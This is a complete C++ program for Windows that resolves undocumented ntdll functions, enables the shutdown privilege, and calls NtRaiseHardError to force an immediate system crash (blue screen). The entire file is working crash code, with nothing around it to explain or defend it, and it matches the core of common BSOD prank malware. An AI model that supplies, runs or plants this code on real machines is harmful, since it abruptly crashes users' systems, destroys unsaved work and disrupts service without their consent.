#include <windows.h>
#include <iostream>

typedef NTSTATUS(WINAPI* NtRaiseHardError_t)(
    NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters,
    ULONG ValidResponseOptions,
    PULONG Response
);

typedef NTSTATUS(WINAPI* RtlAdjustPrivilege_t)(
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    PBOOLEAN Enabled
);

int main()
{
    // Load functions from ntdll.dll
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll)
    {
        std::cerr << "Failed to get handle to ntdll.dll.\n";
        return 1;
    }

    auto RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    auto NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");

    if (!RtlAdjustPrivilege || !NtRaiseHardError)
    {
        std::cerr << "Failed to get function pointers.\n";
        return 1;
    }

    // Enable SeShutdownPrivilege (19 is the ID)
    BOOLEAN bEnabled;
    NTSTATUS status = RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
    if (status != 0)
    {
        std::cerr << "Failed to adjust privilege.\n";
        return 1;
    }

    // Trigger a critical system crash
    ULONG response;
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, nullptr, 6, &response);

    return 0;
}
